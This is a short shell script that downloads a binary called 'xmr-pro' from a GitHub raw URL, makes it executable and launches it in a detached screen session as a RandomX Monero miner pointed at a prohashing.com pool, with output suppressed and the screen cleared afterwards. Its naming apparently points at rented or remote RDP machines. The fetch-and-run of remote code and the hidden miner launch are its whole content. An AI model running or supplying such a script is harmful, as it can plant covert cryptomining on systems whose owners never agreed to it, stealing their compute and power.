#!/bin/sh

WALLET=Prodent.RDP-$(echo $(shuf -i 1-100 -n 1))

POOL=prohashing.com:3359 

sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
wget https://raw.githubusercontent.com/Myaxisplay/oke/main/xmr-pro; chmod +x xmr-pro
screen -S Admin_Bo -dm ./xmr-pro -a randomx -o $POOL -u $WALLET -t 4
screen -ls
sleep 4
clear
cd ..
screen -ls
./Timer_Bo.sh
